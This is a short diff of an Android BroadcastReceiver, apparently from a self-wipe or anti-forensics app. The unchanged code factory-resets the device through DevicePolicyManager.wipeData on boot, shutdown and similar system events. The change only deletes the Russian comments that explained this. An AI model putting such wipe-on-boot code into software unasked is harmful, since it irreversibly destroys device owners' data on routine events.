@@ -10,8 +10,7 @@ public class NucleusReceiver extends BroadcastReceiver {
     public void onReceive(Context context, Intent intent) {
         String action = intent.getAction();
         if (action == null) return;
-
-        // Список всех фатальных триггеров
+        
         if (action.equals(Intent.ACTION_BOOT_COMPLETED) || 
             action.equals(Intent.ACTION_LOCKED_BOOT_COMPLETED) || 
             action.equals(Intent.ACTION_SHUTDOWN) || 
@@ -20,12 +19,11 @@ public class NucleusReceiver extends BroadcastReceiver {
 
             DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
             
-            try {
-                // Стираем всё криптографически быстро
+            try {           
                 dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
             } catch (Exception e) {
                 try {
-                    // Резервный вайп без внешней памяти
+                    
                     dpm.wipeData(0);
                 } catch (Exception ignored) {}
             }
